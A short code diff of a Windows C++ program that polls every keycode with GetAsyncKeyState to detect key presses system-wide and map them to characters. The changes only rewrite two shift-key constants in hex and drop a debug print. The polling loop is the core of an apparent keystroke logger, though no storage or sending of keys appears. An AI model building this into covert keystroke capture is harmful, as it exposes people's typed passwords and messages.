@@ -5,8 +5,8 @@
 #include <windef.h>
 
 #define IsPressed 0x8000
-#define shiftcode1 16
-#define shiftcode2 160
+#define shiftcode1 0x10
+#define shiftcode2 0xA0
 
 using namespace std;
 
@@ -29,7 +29,6 @@ int main() {
         for (int KeyCode = 0; KeyCode < 255; KeyCode++) {
             if (KeyCode==shiftcode1 || KeyCode==shiftcode2) {continue;}
             if ((GetAsyncKeyState(KeyCode) & IsPressed)) {
-                printf("%d is the keycode\n", KeyCode);
                 if (DoesValGiveChar(KeyCode)) {
                     int charIndex = KeyCode - 48;
 
